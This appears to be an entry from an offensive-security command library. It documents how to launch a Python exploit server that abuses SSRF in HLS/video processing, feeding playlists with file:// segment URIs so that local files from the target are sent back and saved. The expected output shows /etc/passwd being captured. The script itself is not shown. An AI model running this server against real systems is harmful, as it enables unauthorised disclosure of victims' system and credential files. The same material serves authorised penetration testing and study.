---
id: cmd-file-server-001
data: >-
  python3 file_reading_server.py --external-addr <external-ip-of-your-server>
  --port 8080
tags:
  - ssrf
  - exploit-server
type: command
output: >-
  Server listening on port 8080; debug logs for requests; files saved as
  <random>_<filename>
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.405Z'
verified: false
validated: true
submitted: true
---
# run-file-reading-server

## Command

```bash
python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080
```

## Description

Starts a Python HTTP server to handle SSRF requests for HLS playlists, serves initial.m3u based on ?filename parameter, processes segment requests including file:// URIs, concatenates contents, and saves the local file to disk.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--external-addr` | External IP of the server for HLS responses | Yes |
| `--port` | Port to listen on (default 8080) | No |

## Examples

### Basic Usage

```bash
python3 file_reading_server.py --external-addr 203.0.113.1 --port 8080
```

### Advanced Usage

Default port usage:

```bash
python3 file_reading_server.py --external-addr 203.0.113.1
```

## Expected Output

Console shows 'Server running on http://0.0.0.0:8080'; upon SSRF, logs requests like 'Received SSRF for /initial.m3u?filename=/etc/passwd', fetches segments, and saves e.g., 'abc123_etc_passwd' with file contents.

## Related

- [[commands/generate-avi-with-file-uri]]
- [[procedures/Set-Up-Exploit-Server-for-File-Disclosure]]
